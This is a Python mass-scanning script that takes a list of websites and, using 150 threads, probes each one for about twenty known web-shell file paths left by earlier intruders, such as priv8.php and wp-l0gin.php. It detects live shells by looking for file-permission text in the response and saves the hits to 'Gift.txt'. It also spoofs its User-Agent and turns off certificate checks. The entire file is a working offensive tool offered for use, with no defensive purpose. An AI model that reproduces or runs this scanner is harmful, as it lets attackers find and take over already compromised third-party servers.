# -*- coding: utf-8 -*-
import sys
import requests
import re
import random
import string
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
requests.urllib3.disable_warnings()

try:
    if len(sys.argv) > 1:
        target_file_path = sys.argv[1]
    else:
        target_file_path = input("Enter Your Site List >> ")

    with open(target_file_path, mode='r', encoding='utf-8') as file:
        target = [line.strip() for line in file.readlines()]

    def ran(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    Pathlist = [
        '/sts.php',
        '/wp-hoard.php',
        '/wp-l0gin.php', 
        '/priv8.php',
        '/wp-post-editor.php',
        '/404.php',
        '/users.php',
        '/classwithtostring.php',
        '/wp-head.php',
        '/admin.php',
        '/about.php',
        '/dropdown.php',
        '/wp-header.php',
        '/radio.php',
        '/simple.php',
        '/cong.php',
        '/options.php',
        '/wp-content/index.php?x=ooo',
        '/wp-admin/options.php',
        '/wp-content/plugins/fix/up.php',
    ]

    class EvaiLCode:
        def __init__(self):
            self.headers = {
                'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

        def URLdomain(self, site):
            if site.startswith("http://"):
                site = site.replace("http://", "")
            elif site.startswith("https://"):
                site = site.replace("https://", "")
            else:
                pass
            pattern = re.compile('(.*)/')
            while re.findall(pattern, site):
                sitez = re.findall(pattern, site)
                site = sitez[0]
            return site

        def checker(self, site):
            try:
                url = "http://" + self.URLdomain(site)
                for Path in Pathlist:
                    check = requests.get(url + Path, headers=self.headers, verify=False, timeout=15).content
                    if '-rw-r--r--' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Gift.txt', 'a').write(url + Path + "\n")
                        break
                    else:
                        print('[x] {} --> {}[Not Vuln]'.format(url, fr))  # Corrected the print syntax

            except:
                pass

    Control = EvaiLCode()

    def FlashKiss(site):
        try:
            Control.checker(site)
        except:
            pass

    mp = Pool(150)
    mp.map(FlashKiss, target)
    mp.close()
    mp.join()
    input("Check Gift.txt File")

except Exception as e:
    print(f"An error occurred: {e}")
